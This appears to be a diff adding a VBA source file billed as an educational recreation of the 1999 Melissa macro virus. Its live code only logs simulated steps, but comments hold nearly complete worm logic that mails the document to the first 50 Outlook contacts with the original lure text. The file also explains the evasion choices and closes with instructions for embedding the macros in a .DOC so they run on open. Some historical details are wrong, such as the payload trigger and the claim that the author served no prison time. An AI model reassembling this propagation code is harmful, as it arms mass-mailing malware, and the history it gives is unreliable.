@@ -1,0 +1,301 @@
+' ============================================================================
+' EDUCATIONAL RECREATION - MELISSA VIRUS (1999)
+' ============================================================================
+' ORIGINAL AUTHOR: David L. Smith
+' RELEASE DATE: March 26, 1999
+' TYPE: Macro Virus (Microsoft Word VBA)
+' PLATFORM: Windows/Mac with Microsoft Word 97/2000
+' IMPACT: Infected ~15-20% of business computers, $80M - $1B USD in damages
+'
+' ⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT EXECUTE ⚠️
+' ============================================================================
+'
+' HOW THE VIRUS WORKED (High-Level Overview):
+' ==========================================
+' 1. DISTRIBUTED AS a Word document named "list.doc" 
+' 2. CONTAINED MACRO VIRUS in the AutoOpen macro (runs when document opens)
+' 3. WHEN OPENED, the virus checked for installed email client (Outlook)
+' 4. REPLICATED by sending itself to the first 50 contacts in address book
+' 5. REINFECTED normal.dot template to infect all new documents created
+'
+' TECHNICAL BREAKDOWN:
+' ===================
+' Melissa used VBA (Visual Basic for Applications) macros embedded in a Word
+' document. This recreation shows the core mechanisms with SAFETY MODIFICATIONS:
+' - Word document infection (SIMULATED)
+' - Email propagation via Outlook/MAPI (SIMULATED)
+' - Template infection for persistence (SIMULATED)
+'
+' ============================================================================
+
+' ============================================================================
+' MODULE: Melissa Virus Educational Recreation
+' These macros would be embedded in a Word .DOC file or Normal.dot template
+' ============================================================================
+
+' ----------------------------------------------------------------------------
+' AutoOpen: Executes when an infected document is opened
+' This is the entry point - the virus activates on document open
+' ----------------------------------------------------------------------------
+Sub AutoOpen()
+    ' When this document opens, the virus activates immediately
+    ' Original behavior called the infection routine
+    Call InfectAndSpread
+    
+    ' Then display a innocuous message to avoid suspicion
+    ' Original: Displayed "Melissa" author message
+    Call DisplayInnocuousMessage
+End Sub
+
+' ----------------------------------------------------------------------------
+' AutoExec: Executes when Word application starts
+' Ensures virus runs even when opening Word without a document
+' ----------------------------------------------------------------------------
+Sub AutoExec()
+    ' Activates when Microsoft Word application launches
+    Call InfectAndSpread
+End Sub
+
+' ============================================================================
+' CORE MECHANISM 1: Email Propagation via Outlook
+' ============================================================================
+' Melissa's primary spreading mechanism - it used Outlook to email itself
+
+Sub InfectAndSpread()
+    On Error Resume Next
+    
+    Dim outlookApp As Object
+    Dim nameSpace As Object
+    Dim addressList As Object
+    Dim contactEntry As Object
+    Dim mailItem As Object
+    Dim contactCount As Integer
+    Dim documentPath As String
+    
+    ' Check if security controls are in place (original evasion)
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' The virus checked for Word's security settings
+    
+    LogAction "=== MELISSA VIRUS - EDUCATIONAL SIMULATION ==="
+    LogAction "Attempting to spread via email..."
+    
+    ' Attempt to create Outlook application object
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' Set outlookApp = CreateObject("Outlook.Application")
+    
+    If outlookApp Is Nothing Then
+        LogAction "OUTLOOK NOT FOUND - Cannot spread via email"
+        LogAction "NOTE: Original Melissa required Outlook to be installed"
+        Exit Sub
+    End If
+    
+    ' Access MAPI namespace for address book
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' Set nameSpace = outlookApp.GetNameSpace("MAPI")
+    ' Set addressList = nameSpace.AddressLists(1)
+    
+    LogAction "SIMULATED: Would access Outlook address book via MAPI"
+    LogAction "SIMULATED: Would enumerate contacts"
+    
+    ' Send to first 50 contacts (original behavior)
+    ' The number 50 was strategic - fast spread but not obviously malicious
+    contactCount = 0
+    
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
+    ' For Each contactEntry In addressList.AddressEntries
+    '     If contactCount >= 50 Then Exit For
+    '     
+    '     ' Create email to this contact
+    '     Set mailItem = outlookApp.CreateItem(0) ' 0 = Mail item
+    '     mailItem.To = contactEntry.Address
+    '     mailItem.Subject = "Important Message From " & contactEntry.Name
+    '     mailItem.Body = "Here is that document that you asked for" & vbCr & vbCr & _
+    '                     "Don't show anyone" & vbCr & vbCr & _
+    '                     "Melissa"
+    '     
+    '     ' Attach infected document
+    '     mailItem.Attachments.Add ActiveDocument.FullName
+    '     
+    '     ' Send automatically (no user confirmation in original)
+    '     mailItem.Send
+    '     
+    '     contactCount = contactCount + 1
+    ' Next contactEntry
+    
+    LogAction "SIMULATED: Would send to FIRST 50 contacts"
+    LogAction "SIMULATED: Each email contained infected document"
+    LogAction "EMAIL SUBJECT PATTERN: 'Important Message From [ContactName]'"
+    LogAction "EMAIL BODY: 'Here is that document that you asked for...'"
+    LogAction "NOTE: Social engineering - appeared to come from trusted contact"
+    
+    LogAction "Total simulated sends: " & contactCount & " / 50"
+End Sub
+
+' ============================================================================
+' CORE MECHANISM 2: Template Infection (Persistence)
+' ============================================================================
+' Melissa infected the Normal.dot template, which is loaded for every 
+' new Word document. This ensured the virus spread to all new documents.
+
+Sub InfectTemplate()
+    On Error Resume Next
+    
+    Dim normalTemplate As Object
+    Dim virusModule As Object
+    Dim targetDoc As Object
+    
+    LogAction "--- TEMPLATE INFECTION SIMULATION ---"
+    
+    ' The Normal.dot template is Word's default document template
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' Set normalTemplate = NormalTemplate
+    
+    ' Check if template is already infected
+    ' Original behavior: Looked for existing Melissa code
+    LogAction "SIMULATED: Would check Normal.dot for existing infection"
+    
+    ' Infect the template with virus macros
+    ' The virus copied its macros from the current document to Normal.dot
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
+    ' If Not normalTemplate.HasVBProject Then
+    '     ' Copy virus macros from active document to template
+    '     Set virusModule = ActiveDocument.VBProject.VBComponents
+    '     ' ... macro copying code ...
+    ' End If
+    
+    LogAction "SIMULATED: Would copy virus macros to Normal.dot template"
+    LogAction "SIMULATED: All new documents would now be infected"
+    
+    ' Also infect the document the user is currently working on
+    ' This ensured the virus spread even if template infection failed
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' Set targetDoc = ActiveDocument
+    ' targetDoc.SaveAs targetDoc.FullName
+    
+    LogAction "SIMULATED: Would save virus macros in current document"
+End Sub
+
+' ============================================================================
+' CORE MECHANISM 3: Conditional Payload (Time-Based)
+' ============================================================================
+' Melissa had conditional behaviors - some versions activated a payload
+' based on system date or other triggers
+
+Sub CheckPayloadConditions()
+    Dim currentDate As Date
+    Dim systemMinute As Integer
+    
+    currentDate = Now()
+    systemMinute = Minute(currentDate)
+    
+    ' Original Melissa had minimal destructive payload
+    ' Some variants included date-based triggers
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
+    ' If systemMinute = 0 Or systemMinute = 1 Then
+    '     ' Some variants would insert text into documents
+    '     Selection.TypeText "Twenty-two points, plus triple-word-score..."
+    '     Selection.TypeText "for QY, and no J, no X, help me"
+    ' End If
+    
+    If systemMinute = 0 Or systemMinute = 1 Then
+        LogAction "CONDITION MET: Would insert phrase into document"
+        LogAction "PHRASE: 'Twenty-two points, plus triple-word-score...'"
+    Else
+        LogAction "Condition NOT met - systemMinute = " & systemMinute
+    End If
+End Sub
+
+' ============================================================================
+' EVASION TECHNIQUES
+' ============================================================================
+' Melissa used several techniques to avoid detection
+
+Sub EvasionTechniques()
+    LogAction "--- EVASION TECHNIQUES USED BY MELISSA ---"
+    
+    ' 1. No obvious destructive payload
+    '    - Unlike viruses that deleted files, Melissa just spread
+    '    - This delayed detection and response
+    
+    ' 2. Social engineering
+    '    - Emails appeared to come from known contacts
+    '    - Subject line was personal and intriguing
+    '    - Encouraged secrecy ("Don't show anyone")
+    
+    ' 3. Strategic send limit
+    '    - 50 contacts was enough to spread rapidly
+    '    - But not so many that email patterns were obviously anomalous
+    
+    ' 4. Template infection
+    '    - By infecting Normal.dot, Melissa spread beyond email
+    '    - Any new document created would carry the virus
+    
+    LogAction "1. Minimal destructive payload - just self-replicates"
+    LogAction "2. Social engineering via personalized emails"
+    LogAction "3. Strategic 50-contact limit (spread vs stealth balance)"
+    LogAction "4. Normal.dot template infection for document-based spread"
+End Sub
+
+' ============================================================================
+' DISPLAY INNOCUOUS MESSAGE
+' ============================================================================
+' After infection, display a normal-looking message to avoid suspicion
+
+Sub DisplayInnocuousMessage()
+    ' Original Melissa displayed a message box
+    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
+    ' MsgBox "Melissa was here!", vbInformation, "Microsoft Word"
+    
+    LogAction "SIMULATED: Would display innocuous message box"
+    LogAction "MESSAGE: 'Melissa was here!'"
+End Sub
+
+' ============================================================================
+' HELPER: Logging Function (Educational Demonstration)
+' ============================================================================
+Sub LogAction(message As String)
+    ' In educational recreation, log to file
+    Dim fso As Object
+    Dim logFile As Object
+    Dim logPath As String
+    
+    logPath = "melissa_educational_log.txt"
+    
+    On Error Resume Next
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set logFile = fso.OpenTextFile(logPath, 8, True) ' 8 = Append
+    logFile.WriteLine "[" & Now & "] " & message
+    logFile.Close
+End Sub
+
+' ============================================================================
+' KEY VULNERABILITIES EXPLOITED:
+' =============================
+' 1. MACRO AUTO-EXECUTION: Word macros ran automatically on document open
+'    - AutoOpen executed when document opened
+'    - AutoExec executed when Word application started
+' 2. TRUSTED CONTACTS: Emails appeared from known senders
+'    - Used victim's own address book
+'    - Personalized subject lines
+' 3. OUTLOOK SECURITY: No confirmation for programmatic email sending
+' 4. TEMPLATE MODEL: Normal.dot was loaded by all documents
+' 5. USER TRUST: People opened attachments from "known" contacts
+'
+' AFTERMATH & RESPONSE:
+' ====================
+' 1. Microsoft added macro security warnings in Word 2000
+' 2. Default macro security set to "High" (block unsigned macros)
+' 3. David L. Smith was arrested, fined $15K, served no prison time
+' 4. First federal prosecution under Computer Fraud and Abuse Act for a virus
+' 5. Led to widespread macro security awareness training
+' ============================================================================
+
+' ============================================================================
+' DOCUMENT METADATA (How to create this in a .DOC file):
+' =====================================================
+' 1. Create a Word document with some innocuous content
+' 2. Open Visual Basic Editor (Alt+F11)
+' 3. Insert the AutoOpen and AutoExec macros into ThisDocument module
+' 4. Save as .DOC (not .DOCX, which doesn't support macros by default)
+' 5. When opened on systems with macros enabled, the virus activates
+' ============================================================================
